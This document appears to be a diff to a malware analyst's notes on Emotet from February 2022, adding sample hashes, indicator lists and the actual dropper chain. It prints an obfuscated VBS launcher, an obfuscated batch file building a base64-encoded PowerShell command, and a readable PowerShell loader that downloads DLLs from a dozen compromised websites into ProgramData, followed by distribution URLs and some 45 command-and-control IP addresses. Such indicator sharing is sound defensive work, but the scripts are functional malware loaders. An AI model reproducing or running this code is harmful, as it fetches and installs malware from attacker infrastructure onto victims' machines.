@@ -1,6 +1,104 @@
 Emotet 2022
 
+First payload 02.02.2022
+
+Epoch4 - .xls > .dll
+
+.xls 012a69a36359554f7ef5e13393e2327c65535d23808b18fd07f64d362dcef217
+
+.dll 151a86815dff16475b02f38cae265fa445ada8c34a5ae7cd5d6f8f829f4f2e3e
+
+.vbs 
+
+Dim fhnl213klsd:Set fhnl213klsd=wsCriPt.creAteobJEct(replace("WDqhnuioSDqhnuiocrDqhnuioipDqhnuiot.DqhnuioSDqhnuiohDqhnuioelDqhnuiol","Dqhnuio","")):jlwkhdelsdgk=replace("Gswec:Gswe\pGsweroGswegramGswedaGswetGswea\jledshf.bGsweat","Gswe",""):fhnl213klsd.rUn jlwkhdelsdgk,0,true:indlhwkjhks=rePLace("cGswemGswed Gswe/Gswec sGswetGswearGswet Gswe/GsweB GswecGswe:Gswe\wGsweinGswedGsweowGswes\sGsweysGswewGsweoGswew6Gswe4\rGsweundlGswel3Gswe2.eGswexGswee cGswe:Gswe\pGsweroGswegraGswemdGsweatGswea\vbkwk.dGswelGswel,dfsgeresd","Gswe",""):fhnl213klsd.ruN indlhwkjhks,0:Set fhnl213klsd=nothing
+
+.bat
+
+dir c:\&echo zdrfsgESTGaw3sryzsdfgzsdertfsjehgfskug3kjshgegZSFHdrHzDSS356tzgd&SET hjhdrdresas=po&echo DGsg4e6ysxdfhzxdfggDHdrthdrx dhDthDghDRtgsd45ydxfh&SET YUderhdD3=wers&echo dgbkw4tdgfTGHJ5rs6dt hse547thxDFXHtgjfxdtrgdfhxdfgf&SET VvdsFHd4=hell -e&echo Has4htksdighfdGJSXDghs4tshdkrg zasg3ksjfHXGHJXdfezse34&SET HJtre4edtgf=nc JABnAGoAcwBlAGIAbgBnAHUAawBpAHcAdQBnADMAawB3AGoAZAA9ACIAaAB0AHQAcAA6AC8ALwBhAGMAdABpAHYAaQBkAGEAZABlAHMALgBsAGEAZgBvAHIAZQB0AGwAYQBuAGcAdQBhAGcAZQBzAC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwBCAGwAawBkAE8ASwBEAFgATAAvACwAaAB0AHQAcAA6AC8ALwBzAGIAYwBvAHAAeQBsAGkAdgBlAC4AYwBvAG0ALgBiAHIALwByAGoAdQB6AC8AdwAvACwAaAB0AHQAcABzADoALwAvAHQAcgBhAHMAaQB4AC4AYwBvAG0ALwB3AHAALQBhAGQAbQBpAG4ALwB5ADUAQQBhADEAagB0ADAAUwBwADIAUQBrAC8ALABoAHQAdABwAHMAOgAvAC8AdwB3AHcALgBwAGEAcgBrAGkAbgBzAG8AbgBzAC4AYwBvAC4AaQBuAC8AYQBiAGMALwBZADYAWQAwAGYAVABiAFUARQBnADYALwAsAGgAdAB0AHAAcwA6AC8ALwBiAGkAegAuAG0AZQByAGwAaQBuAC4AdQBhAC8A&echo Fghsdregsh3ksjdfhkgzfHGhjXdgzs4tjsrhdfkjgdkjzkjhk4jdksrjgcvbnw34&SET bsRHYdtsughzsd23zfg=dwBwAC0AYQBkAG0AaQBuAC8AVwA2AGEAZwB0AEYAUwBSAFoARwB0ADMANwAxAGQAVgAvACwAaAB0AHQAcAA6AC8ALwBiAHIAdQBjAGsAZQB2AG4ALgBzAGkAdABlAC8AMwB5AHoAdAB6AHoAdgBoAC8AbgBtAFkANAB3AFoAZgBiAFkATAAvACwAaAB0AHQAcABzADoALwAvAHAAYQByAGQAaQBzAGsAbwBvAGQALgBjAG8AbQAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwBOAFIALwAsAGgAdAB0AHAAcwA6AC8ALwBkAGEAdQBqAGkAbQBhAGgAYQByAGEAagBtAGEAbgBkAGkAcgAuAG8AcgBnAC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8ANgAzAEQAZQAvACwAaAB0AHQAcABzADoALwAvAGQAYQB0AGEAcwBpAHQAcwAuAGMAbwBtAC8AdwBwAC0AaQBuAGMAbAB1AGQAZQBzAC8AWgBrAGoANABRAE8ALwAsAGgAdAB0AHAAcwA6AC8ALwBhAG4AdQBnAGUAcgBhAGgAbQBhAHMAaQBuAHQAZQByAG4AYQBzAGkA&echo HSDr4hklsdifhglsidhg shdk4hystDjGhJGFyYUOf56FUghjcvGFHdrgdr6retydjeh4gjehg&SET cvxerses3srYHDFj=bwBuAGEAbAAuAGMAbwAuAGkAZAAvAHcAcAAtAGEAZABtAGkAbgAvAFMASgBiAHgARQA1AEkALwAsAGgAdAB0AHAAcwA6AC8ALwBhAHQAbQBlAGQAaQBjAC4AYwBsAC8AcwBpAHMAdABlAG0AYQBzAC8AMwBaAGIAcwBVAEEAVQAvACwAaAB0AHQAcABzADoALwAvAGEAbgB3AGEAcgBhAGwAYgBhAHMAYQB0AGUAZQBuAC4AYwBvAG0ALwBGAG8AeAAtAEMANAAwADQALwBtAEQASABrAGYAZwBlAGIATQBSAHoAbQBHAEsAQgB5AC8AIgAuAHMAcABMAGkAVAAoACIALAAiACkAOwBmAE8AcgBlAGEAQwBoACgAJABoAGsAbAB3AFIASABKAFMAZQA0AGgAIABpAG4AIAAkAGcAagBzAGUAYgBuAGcAdQBrAGkAdwB1AGcAMwBrAHcAagBkACkAewAkAEoAcwAzAGgAbABzAGsAZABjAGYAawA9ACIAdgBiAGsAdwBrACIAOwAkAHMAZABlAHcASABTAHcAMwBnAGsAagBzAGQAPQBHAGUAdAAtAFIAYQBuAGQAbwBtADsA&echo rthiuHIUGuiygibgIBIUUYfuyGIGIHIBTYDRTDERWST676tuYGHIGUG65r7GkioOOHuYGFuVCR45rfV&SET fgdsahkaw3DF=JABJAEQAcgBmAGcAaABzAGIAegBrAGoAeABkAD0AIgBjADoAXABwAHIAbwBnAHIAYQBtAGQAYQB0AGEAXAAiACsAJABKAHMAMwBoAGwAcwBrAGQAYwBmAGsAKwAiAC4AZABsAGwAIgA7AGkATgB2AE8AawBlAC0AdwBFAGIAcgBlAFEAdQBlAHMAVAAgAC0AdQBSAGkAIAAkAGgAawBsAHcAUgBIAEoAUwBlADQAaAAgAC0AbwB1AFQAZgBpAEwAZQAgACQASQBEAHIAZgBnAGgAcwBiAHoAawBqAHgAZAA7AGkAZgAoAHQAZQBzAHQALQBwAEEAdABIACAAJABJAEQAcgBmAGcAaABzAGIAegBrAGoAeABkACkAewBpAGYAKAAoAGcAZQB0AC0AaQBUAGUAbQAgACQASQBEAHIAZgBnAGgAcwBiAHoAawBqAHgAZAApAC4ATABlAG4AZwB0AGgAIAAtAGcAZQAgADUAMAAwADAAMAApAHsAYgByAGUAYQBrADsAfQB9AH0A
+echo BGZDSRFgtshk4usthkdfhg gzdfghsklehklyxdjfhDTjufyjxFdHxdrgxdh5687ogfy78o9ghu&start/B /WAIT %hjhdrdresas%%YUderhdD3%%VvdsFHd4%%HJtre4edtgf%%bsRHYdtsughzsd23zfg%%cvxerses3srYHDFj%%fgdsahkaw3DF%&echo XVBGSdegfshkj4gskrjfbhGTJdr shd4gjsdfhkdgjskj TGJUDyid4dstgfhxdfds
+
+.ps1
+
+$gjsebngukiwug3kwjd = "http://actividades.laforetlanguages.com/wp-admin/BlkdOKDXL/", "http://sbcopylive.com.br/rjuz/w/", "https://trasix.com/wp-admin/y5Aa1jt0Sp2Qk/", "https://www.parkinsons.co.in/abc/Y6Y0fTbUEg6/", "https://biz.merlin.ua/wp-admin/W6agtFSRZGt371dV/", "http://bruckevn.site/3yztzzvh/nmY4wZfbYL/", "https://pardiskood.com/wp-content/NR/", "https://daujimaharajmandir.org/wp-includes/63De/", "https://datasits.com/wp-includes/Zkj4QO/", "https://anugerahmasinternasional.co.id/wp-admin/SJbxE5I/", "https://atmedic.cl/sistemas/3ZbsUAU/", "https://anwaralbasateen.com/Fox-C404/mDHkfgebMRzmGKBy/"
+foreach ($hklwrhjse4h in $gjsebngukiwug3kwjd) {
+  $js3hlskdcfk = "vbkwk"
+  $sdewhsw3gkjsd = get-random
+  $idrfghsbzkjxd = "c:\\programdata\\" + $js3hlskdcfk + ".dll"
+  invoke-webrequest -uri $hklwrhjse4h -outfile $idrfghsbzkjxd
+  if (test-path $idrfghsbzkjxd) {
+    if ((get-item $idrfghsbzkjxd).length -ge 50000) {
+      break
+    }
+  }
+}
+
+.dll distro
+
+http://actividades.laforetlanguages.com/wp-admin/BlkdOKDXL/
+http://sbcopylive.com.br/rjuz/w/
+https://trasix.com/wp-admin/y5Aa1jt0Sp2Qk/
+https://www.parkinsons.co.in/abc/Y6Y0fTbUEg6/
+https://biz.merlin.ua/wp-admin/W6agtFSRZGt371dV/
+http://bruckevn.site/3yztzzvh/nmY4wZfbYL/
+https://pardiskood.com/wp-content/NR/
+https://daujimaharajmandir.org/wp-includes/63De/
+https://datasits.com/wp-includes/Zkj4QO/
+https://anugerahmasinternasional.co.id/wp-admin/SJbxE5I/
+https://atmedic.cl/sistemas/3ZbsUAU/
+https://anwaralbasateen.com/Fox-C404/mDHkfgebMRzmGKBy/
+
+c2's
+
+23.246.204.126:443
+149.56.163.161:8080
+212.237.5.209:443
+159.89.230.105:443
+178.63.25.185:443
+104.251.214.46:8080
+195.154.133.20:443
+217.182.143.207:443
+103.75.201.4:443
+162.243.175.63:443
+173.212.193.249:8080
+138.185.72.26:8080
+107.182.225.142:8080
+45.118.115.99:8080
+46.55.222.11:443
+212.237.56.116:7080
+178.79.147.66:8080
+160.16.102.168:80
+212.237.17.99:8080
+51.38.71.0:443
+207.38.84.195:8080
+212.24.98.99:8080
+110.232.117.186:8080
+159.8.59.82:8080
+131.100.24.231:80
+58.227.42.236:80
+164.68.99.3:8080
+103.75.201.2:443
+41.76.108.46:8080
+162.214.50.39:7080
+50.116.54.215:443
+203.114.109.124:443
+45.142.114.231:8080
+192.254.71.210:443
+185.157.82.211:8080
+45.118.135.203:7080
+129.232.188.93:443
+45.176.232.124:443
+79.172.212.216:8080
+158.69.222.101:443
+144.76.186.49:8080
+200.17.134.35:7080
+176.104.106.96:8080
+81.0.236.90:443
+216.158.226.206:443
+
+
 ************************************************************************************************************
+
+First payload - AM - 02.02.2022
 
 Epoch4 - .xls > .dll
 
@@ -15,6 +113,11 @@ rundll32.exe ..\iix.ocx,D"&"l"&"lR"&"egister"&"Serve"&"r
 rundll32.exe "C:\Users\Admin\iix.ocx",DllRegisterServer
 
 GET:  https://103.75.201.4/Q
+
+Additonal .ddl drops:
+
+https://bossblogg.com/wp-includes/sOfCzg6/
+
 
 c2's
 
